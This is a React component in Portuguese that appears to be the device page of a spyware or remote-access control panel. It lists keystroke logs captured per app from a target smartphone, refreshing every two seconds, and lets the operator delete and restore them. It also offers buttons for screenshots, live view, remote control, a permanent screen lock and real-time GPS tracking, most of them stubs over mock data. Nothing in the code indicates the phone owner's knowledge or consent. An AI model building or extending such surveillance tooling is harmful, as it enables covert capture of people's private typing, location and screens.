import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import LockedScreen from "@/components/LockedScreen";
import PhoneFrame from "@/components/PhoneFrame";
import { trpc } from "@/lib/trpc";

interface DeviceDetailsProps {
  deviceId: string;
  user?: { email: string; name: string };
  onLogout?: () => void;
}

export default function DeviceDetails({
  deviceId,
  user,
  onLogout,
}: DeviceDetailsProps) {
  const [, setLocation] = useLocation();
  const deviceName = `Smartphone ${deviceId}`;
  
  const [activeTab, setActiveTab] = useState("info");
  const [isLiveActive, setIsLiveActive] = useState(true);
  const [isControlActive, setIsControlActive] = useState(false);
  const [isScreenLocked, setIsScreenLocked] = useState(false);
  const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());

  // Fetch keylogs from backend
  const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
    { deviceId },
    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
  );

  // Fetch deleted keylogs from backend
  const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
    { deviceId }
  );

  // Mutations
  const deleteKeylogMutation = trpc.keylogs.delete.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
      setSelectedKeylogs(new Set());
    },
  });

  const restoreKeylogMutation = trpc.keylogs.restore.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
    },
  });

  const handleScreenshot = () => {
    alert(`📸 Screenshot capturado de ${deviceName}`);
  };

  const handleStopLive = () => {
    setIsLiveActive(false);
    alert("⏹️ Visualização ao vivo parada");
  };

  const handleActivateControl = () => {
    setIsControlActive(!isControlActive);
    alert(
      isControlActive
        ? "🎮 Controle desativado"
        : "🎮 Controle remoto ativado"
    );
  };

  const handleLockScreen = () => {
    setIsScreenLocked(true);
    alert("🔒 Tela travada! Digite a senha para destravar.");
  };

  const handleUnlockScreen = () => {
    setIsScreenLocked(false);
    alert("🔓 Tela desbloqueada com sucesso!");
  };

  const handleRemoveDevice = () => {
    if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
      alert(`❌ Dispositivo ${deviceName} removido com sucesso`);
      setLocation("/dispositivos");
    }
  };

  const handleToggleKeylogSelection = (id: number) => {
    const newSelected = new Set(selectedKeylogs);
    if (newSelected.has(id)) {
      newSelected.delete(id);
    } else {
      newSelected.add(id);
    }
    setSelectedKeylogs(newSelected);
  };

  const handleRemoveSelectedKeylogs = () => {
    if (selectedKeylogs.size === 0) {
      alert("Selecione pelo menos um keylog para remover");
      return;
    }
    selectedKeylogs.forEach((id) => {
      deleteKeylogMutation.mutate({ keylogId: id });
    });
  };

  const handleRemoveAllKeylogs = () => {
    if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
      keylogs.forEach((keylog: any) => {
        deleteKeylogMutation.mutate({ keylogId: keylog.id });
      });
    }
  };

  const handleRestoreKeylog = (id: number) => {
    restoreKeylogMutation.mutate({ keylogId: id });
  };

  // Format timestamp to readable time
  const formatTime = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleTimeString("pt-BR");
  };

  if (isScreenLocked) {
    return <LockedScreen deviceName={deviceName} onUnlock={handleUnlockScreen} />;
  }

  return (
    <div className="space-y-6 pb-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <Button
          onClick={() => setLocation("/dispositivos")}
          variant="outline"
          className="text-cyan-400 border-cyan-600 hover:bg-cyan-900"
        >
          ← Voltar
        </Button>
        <h1 className="text-3xl font-bold text-cyan-400">
          {deviceName}
        </h1>
      </div>

      {/* Action Buttons */}
      <div className="flex flex-wrap gap-3">
        <Button
          onClick={handleScreenshot}
          className="bg-cyan-500 hover:bg-cyan-600 text-white"
        >
          📸 Capturar Screenshot
        </Button>
        <Button
          onClick={handleStopLive}
          className="bg-red-600 hover:bg-red-700 text-white"
        >
          ⏹️ Parar Ao Vivo
        </Button>
        <Button
          onClick={handleActivateControl}
          className="bg-blue-600 hover:bg-blue-700 text-white"
        >
          🎮 Ativar Controle
        </Button>
        <Button
          onClick={handleLockScreen}
          className="bg-orange-600 hover:bg-orange-700 text-white"
        >
          🚫 Travar Tela
        </Button>
        <Button
          onClick={handleRemoveDevice}
          className="bg-red-700 hover:bg-red-800 text-white"
        >
          🗑️ Remover Dispositivo
        </Button>
      </div>

      {/* Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
          <TabsTrigger
            value="info"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ℹ️ Informações
          </TabsTrigger>
          <TabsTrigger
            value="commands"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⚙️ Comandos
          </TabsTrigger>
          <TabsTrigger
            value="screenshots"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📸 Screenshots
          </TabsTrigger>
          <TabsTrigger
            value="keylogs"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⌨️ Keylogs
          </TabsTrigger>
          <TabsTrigger
            value="history"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📜 Histórico
          </TabsTrigger>
        </TabsList>

        {/* Aba: Informações */}
        <TabsContent value="info" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📋 Informações Básicas</h3>
              <div className="space-y-3 text-slate-300">
                <div>
                  <p className="text-slate-400 text-sm">Nome do Dispositivo</p>
                  <p className="font-semibold">{deviceName}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Modelo</p>
                  <p className="font-semibold">Samsung Galaxy A12</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Sistema Operacional</p>
                  <p className="font-semibold">Android 11</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Versão</p>
                  <p className="font-semibold">11.0.1</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Localização</p>
                  <p className="font-semibold">São Paulo, SP</p>
                </div>
              </div>
            </Card>

            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📊 Status do Sistema</h3>
              <div className="space-y-3">
                <div>
                  <div className="flex justify-between mb-1">
                    <p className="text-slate-400 text-sm">Bateria</p>
                    <p className="text-cyan-400 font-semibold">85%</p>
                  </div>
                  <div className="w-full bg-slate-700 rounded-full h-2">
                    <div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div>
                  </div>
                </div>
                <div>
                  <div className="flex justify-between mb-1">
                    <p className="text-slate-400 text-sm">Memória</p>
                    <p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p>
                  </div>
                  <div className="w-full bg-slate-700 rounded-full h-2">
                    <div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div>
                  </div>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Sinal</p>
                  <p className="text-cyan-400 font-semibold">📶 Excelente</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Temperatura</p>
                  <p className="text-cyan-400 font-semibold">36°C</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Último Acesso</p>
                  <p className="text-cyan-400 font-semibold">Agora</p>
                </div>
              </div>
            </Card>
          </div>
        </TabsContent>

        {/* Aba: Comandos */}
        <TabsContent value="commands" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              { icon: "📸", title: "Tirar Screenshot", desc: "Capturar tela do dispositivo" },
              { icon: "🔊", title: "Ativar Som", desc: "Reproduzir som no dispositivo" },
              { icon: "🔒", title: "Bloquear Dispositivo", desc: "Bloquear a tela do dispositivo" },
              { icon: "🚫", title: "Travar Tela", desc: "Travar a tela permanentemente" },
              { icon: "📍", title: "Rastrear Localização", desc: "Obter localização GPS em tempo real" },
              { icon: "🔄", title: "Sincronizar", desc: "Sincronizar dados do dispositivo" },
            ].map((cmd, idx) => (
              <Card key={idx} className="bg-slate-800 border-slate-700 p-4 hover:border-cyan-500 transition">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="text-2xl mb-2">{cmd.icon}</p>
                    <h4 className="text-cyan-400 font-bold">{cmd.title}</h4>
                    <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                  </div>
                  <Button size="sm" className="bg-cyan-600 hover:bg-cyan-700">
                    Executar
                  </Button>
                </div>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Aba: Screenshots */}
        <TabsContent value="screenshots" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[1, 2, 3, 4].map((i) => (
              <Card key={i} className="bg-slate-800 border-slate-700 p-4">
                <div className="bg-slate-900 rounded-lg aspect-video mb-3 flex items-center justify-center">
                  <div className="text-center">
                    <p className="text-4xl mb-2">📱</p>
                    <p className="text-slate-400 text-sm">Screenshot {i}</p>
                    <p className="text-slate-500 text-xs mt-1">2 horas atrás</p>
                  </div>
                </div>
                <Button size="sm" variant="outline" className="w-full text-cyan-400 border-cyan-600">
                  Visualizar
                </Button>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Aba: Keylogs */}
        <TabsContent value="keylogs" className="space-y-4">
          <div className="flex gap-2 mb-4">
            <Button
              size="sm"
              className="bg-red-600 hover:bg-red-700"
              onClick={handleRemoveSelectedKeylogs}
              disabled={selectedKeylogs.size === 0}
            >
              🗑️ Remover Selecionados ({selectedKeylogs.size})
            </Button>
            <Button
              size="sm"
              variant="outline"
              className="text-red-400 border-red-600"
              onClick={handleRemoveAllKeylogs}
            >
              ⚠️ Remover Todos
            </Button>
          </div>

          {keylogsLoading ? (
            <div className="text-center py-8">
              <p className="text-slate-400">Carregando keylogs...</p>
            </div>
          ) : keylogs.length === 0 ? (
            <div className="text-center py-8">
              <p className="text-slate-400">Nenhum keylog registrado</p>
            </div>
          ) : (
            <div className="space-y-2">
              {keylogs.map((log: any) => (
                <Card key={log.id} className="bg-slate-800 border-slate-700 p-4">
                  <div className="flex items-start gap-3">
                    <input
                      type="checkbox"
                      checked={selectedKeylogs.has(log.id)}
                      onChange={() => handleToggleKeylogSelection(log.id)}
                      className="mt-1"
                    />
                    <div className="flex-1">
                      <p className="text-cyan-300 font-semibold">{log.app}</p>
                      <p className="text-slate-300 text-sm break-words">{log.text}</p>
                      <p className="text-slate-500 text-xs mt-1">{formatTime(log.timestamp)}</p>
                    </div>
                  </div>
                </Card>
              ))}
            </div>
          )}

          {deletedKeylogs.length > 0 && (
            <div className="mt-8">
              <h4 className="text-cyan-400 font-bold mb-3">🗑️ Keylogs Deletados</h4>
              <div className="space-y-2">
                {deletedKeylogs.map((log: any) => (
                  <Card key={log.id} className="bg-slate-800 border-slate-700 p-4 opacity-50">
                    <div className="flex items-start justify-between">
                      <div>
                        <p className="text-slate-400 font-semibold">{log.app}</p>
                        <p className="text-slate-400 text-sm break-words">{log.text}</p>
                        <p className="text-slate-500 text-xs mt-1">{formatTime(log.timestamp)}</p>
                      </div>
                      <Button
                        size="sm"
                        variant="outline"
                        className="text-green-400 border-green-600"
                        onClick={() => handleRestoreKeylog(log.id)}
                      >
                        ↩️ Restaurar
                      </Button>
                    </div>
                  </Card>
                ))}
              </div>
            </div>
          )}
        </TabsContent>

        {/* Aba: Histórico */}
        <TabsContent value="history" className="space-y-4">
          <div className="space-y-3">
            {[
              { icon: "✅", title: "Conectado", time: "Agora" },
              { icon: "📸", title: "Screenshot capturado", time: "5 min atrás" },
              { icon: "🔒", title: "Tela bloqueada", time: "15 min atrás" },
              { icon: "🔄", title: "Sincronizado", time: "1 hora atrás" },
              { icon: "📍", title: "Localização atualizada", time: "2 horas atrás" },
            ].map((event, idx) => (
              <Card key={idx} className="bg-slate-800 border-slate-700 p-4">
                <div className="flex items-center gap-3">
                  <p className="text-2xl">{event.icon}</p>
                  <div>
                    <p className="text-cyan-300 font-semibold">{event.title}</p>
                    <p className="text-slate-400 text-sm">{event.time}</p>
                  </div>
                </div>
              </Card>
            ))}
          </div>
        </TabsContent>
      </Tabs>

      {/* Phone Frame Preview */}
      {isLiveActive && (
        <div className="mt-8">
          <h3 className="text-cyan-400 font-bold mb-4">📱 Visualização ao Vivo</h3>
          <div className="flex justify-center">
            <PhoneFrame />
          </div>
        </div>
      )}
    </div>
  );
}
